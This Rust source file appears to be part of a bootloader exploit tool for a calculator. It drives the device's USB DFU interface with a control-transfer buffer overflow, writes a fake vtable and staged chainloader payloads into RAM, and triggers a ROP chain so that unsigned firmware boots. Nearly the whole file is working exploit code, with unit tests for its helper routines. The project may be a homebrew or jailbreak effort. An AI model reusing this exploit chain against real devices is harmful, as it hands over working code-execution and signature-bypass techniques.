//! Shared constants, primitives, and DFU routines for bootloader implementations.

use anyhow::{Context, Result, bail};
use rusb::{DeviceHandle, GlobalContext};
use std::fs;
use std::path::PathBuf;

use crate::dfu::{TIMEOUT, idle, read_memory, ready, set_address, write_memory};

pub const BASE: u32 = 0x24000000;
pub const RAM_SIZE: usize = 0x3F000;
pub const FAKE_VTABLE: u32 = BASE + 0x80;
pub const STAGE: u32 = BASE + 0x10000;
pub const MARKER: u32 = STAGE + 0xC0;
pub const WARM: u32 = BASE + 0x1F000;

pub const EXPECTED_BYTE: u8 = 0x5A;
pub const MARKER_VALUE: u32 = 0xD00DFEED;
pub const MPU_RNR: u32 = 0xE000ED98;
pub const MPU_RASR: u32 = 0xE000EDA0;
pub const MPU_RASR_VALUE: u32 = 0x010B0039;
pub const SRAM_CODE: u32 = STAGE + 0x200;
pub const SRAM_STACK: u32 = STAGE + 0x300;
pub const SRAM_MARKER: u32 = STAGE + 0x1F0;

const RAW_CHAINLOADER: &[u8] = include_bytes!("../../payloads/xip-chainloader.bin");

pub fn get_chainloader() -> Vec<u8> {
    RAW_CHAINLOADER.to_vec()
}

pub fn validate_chainloader(chainloader: &[u8]) -> Result<()> {
    if chainloader.is_empty() || chainloader.len() > 0x100 {
        bail!("invalid chainloader payload");
    }
    Ok(())
}

pub fn word(data: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes(
        data[offset..offset + 4]
            .try_into()
            .expect("slice with incorrect length"),
    )
}

pub fn put(data: &mut [u8], offset: usize, value: u32) {
    data[offset..offset + 4].copy_from_slice(&value.to_le_bytes());
}

pub fn fake_hits(before: &[u8], after: &[u8]) -> Vec<(u32, u8, u8)> {
    fake_hits_with_offset(before, after, 0x824)
}

pub fn fake_hits_with_offset(
    before: &[u8],
    after: &[u8],
    setter_offset: usize,
) -> Vec<(u32, u8, u8)> {
    let mut hits = Vec::new();
    let limit = after.len().saturating_sub(4);
    for offset in (0..limit).step_by(4) {
        if word(after, offset) == FAKE_VTABLE {
            let target = offset + setter_offset;
            if target < after.len() && target < before.len() {
                hits.push((BASE + offset as u32, before[target], after[target]));
            }
        }
    }
    hits
}

pub fn build_stock_vtable(
    flash_data: &[u8],
    stock_callback: u32,
    stock_setter: u32,
    callback: Option<u32>,
) -> Result<Vec<u8>> {
    let cb = callback.unwrap_or(stock_callback);
    let mut table = crate::sigscan::find_vtable(flash_data, stock_callback, stock_setter, 0x100)?;
    if word(&table, 8) != stock_callback {
        bail!("Validation failed: vtable[8] != stock_callback");
    }
    if word(&table, 12) != stock_setter {
        bail!("Validation failed: vtable[12] != stock_setter");
    }
    put(&mut table, 8, cb);
    Ok(table)
}

pub fn save_flash_dump(flash_data: &[u8]) -> Result<()> {
    let default_flash_path = PathBuf::from("firmware/internal-flash-live.bin");
    if let Some(parent) = default_flash_path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    fs::write(&default_flash_path, flash_data).with_context(|| {
        format!("Failed to save flash dump to: {}", default_flash_path.display())
    })?;
    println!(
        "Saved live flash dump to: {}",
        default_flash_path.display()
    );
    Ok(())
}

pub fn reset_and_idle(handle: &DeviceHandle<GlobalContext>) -> Result<()> {
    handle
        .write_control(0x01, 11, 1, 0, &[], TIMEOUT)
        .with_context(|| "Failed to reset interface alternate setting".to_string())?;
    idle(handle)?;
    Ok(())
}

pub fn write_fake_vtable(
    handle: &DeviceHandle<GlobalContext>,
    probe_table: &[u8],
) -> Result<()> {
    write_memory(handle, FAKE_VTABLE, probe_table)?;
    let verified = read_memory(handle, FAKE_VTABLE, probe_table.len())?;
    if verified != probe_table {
        bail!("Fake vtable write verification failed");
    }
    Ok(())
}

pub fn send_probe(handle: &DeviceHandle<GlobalContext>, probe: &[u8]) -> Result<()> {
    set_address(handle, WARM)?;

    let probe_sent = handle
        .write_control(0x21, 1, 2, 0, probe, TIMEOUT)
        .with_context(|| "Failed to send probe overflow".to_string())?;
    println!("probe_overflow_sent={probe_sent}");
    println!("probe_status={}", ready(handle)?);

    let probe_trig = handle
        .write_control(0x01, 11, EXPECTED_BYTE as u16, 0, &[], TIMEOUT)
        .with_context(|| "Failed to send probe trigger".to_string())?;
    println!("probe_trigger={probe_trig}");
    Ok(())
}

pub fn find_fresh_root(hits: &[(u32, u8, u8)]) -> Result<u32> {
    let roots: Vec<u32> = hits
        .iter()
        .filter(|&&(_, old, new)| old != EXPECTED_BYTE && new == EXPECTED_BYTE)
        .map(|&(addr, _, _)| addr)
        .collect();

    if roots.len() != 1 {
        let hex_roots: Vec<String> = roots.iter().map(|r| format!("0x{r:x}")).collect();
        bail!("expected one fresh root, found: {hex_roots:?}");
    }
    Ok(roots[0])
}

pub fn write_stage_payloads(
    handle: &DeviceHandle<GlobalContext>,
    marker_addr: u32,
    stage: &[u8],
    chainloader: &[u8],
) -> Result<()> {
    write_memory(handle, marker_addr, &[0u8; 4])?;
    write_memory(handle, SRAM_MARKER, &[0u8; 4])?;
    write_memory(handle, SRAM_CODE, chainloader)?;
    let chainloader_verify = read_memory(handle, SRAM_CODE, chainloader.len())?;
    if chainloader_verify != chainloader {
        bail!("SRAM code write verification failed");
    }
    write_memory(handle, STAGE, stage)?;
    let stage_verify = read_memory(handle, STAGE, stage.len())?;
    if stage_verify != stage {
        bail!("Stage write verification failed");
    }
    Ok(())
}

pub fn trigger_rop(handle: &DeviceHandle<GlobalContext>, payload: &[u8]) -> Result<()> {
    set_address(handle, WARM)?;
    let rop_sent = handle
        .write_control(0x21, 1, 2, 0, payload, TIMEOUT)
        .with_context(|| "Failed to send ROP overflow payload".to_string())?;
    println!("rop_overflow_sent={rop_sent}");

    match handle.write_control(0x01, 6, 0, 0, &[], TIMEOUT) {
        Ok(trig) => println!("rop_trigger={trig}"),
        Err(e) => println!("DFU_DISCONNECT_EXPECTED: {e}"),
    }

    println!(
        "BOOT_ATTEMPT_SENT: the calculator should now have booted unsigned firmware from Slot B!"
    );
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_word_and_put() {
        let mut buf = vec![0u8; 8];
        put(&mut buf, 0, 0x12345678);
        put(&mut buf, 4, 0xDEADBEEF);
        assert_eq!(word(&buf, 0), 0x12345678);
        assert_eq!(word(&buf, 4), 0xDEADBEEF);
        assert_eq!(&buf[0..4], &[0x78, 0x56, 0x34, 0x12]);
    }

    #[test]
    fn test_fake_hits() {
        let mut before = vec![0u8; 0x1000];
        let mut after = vec![0u8; 0x1000];

        // Put fake vtable pointer at offset 0x100
        put(&mut after, 0x100, FAKE_VTABLE);
        // Default setter offset is 0x824
        let target = 0x100 + 0x824;
        before[target] = 0x00;
        after[target] = EXPECTED_BYTE;

        let hits = fake_hits(&before, &after);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].0, BASE + 0x100);
        assert_eq!(hits[0].1, 0x00);
        assert_eq!(hits[0].2, EXPECTED_BYTE);

        // Test with custom offset (e.g. 0x820 for v24_26)
        let mut after_24 = vec![0u8; 0x1000];
        put(&mut after_24, 0x200, FAKE_VTABLE);
        let target_24 = 0x200 + 0x820;
        before[target_24] = 0x11;
        after_24[target_24] = EXPECTED_BYTE;

        let hits_24 = fake_hits_with_offset(&before, &after_24, 0x820);
        assert_eq!(hits_24.len(), 1);
        assert_eq!(hits_24[0].0, BASE + 0x200);
        assert_eq!(hits_24[0].1, 0x11);
        assert_eq!(hits_24[0].2, EXPECTED_BYTE);
    }

    #[test]
    fn test_find_fresh_root() {
        // Single fresh root (old != EXPECTED_BYTE && new == EXPECTED_BYTE)
        let hits = vec![
            (0x24001000, 0x00, EXPECTED_BYTE),
            (0x24002000, EXPECTED_BYTE, EXPECTED_BYTE), // already was EXPECTED_BYTE
        ];
        assert_eq!(find_fresh_root(&hits).unwrap(), 0x24001000);

        // Zero fresh roots
        let no_hits = vec![(0x24002000, EXPECTED_BYTE, EXPECTED_BYTE)];
        assert!(find_fresh_root(&no_hits).is_err());

        // Multiple fresh roots
        let multi_hits = vec![
            (0x24001000, 0x00, EXPECTED_BYTE),
            (0x24003000, 0x12, EXPECTED_BYTE),
        ];
        assert!(find_fresh_root(&multi_hits).is_err());
    }

    #[test]
    fn test_validate_chainloader() {
        let valid = get_chainloader();
        assert!(validate_chainloader(&valid).is_ok());

        assert!(validate_chainloader(&[]).is_err());
        assert!(validate_chainloader(&vec![0u8; 0x101]).is_err());
    }
}
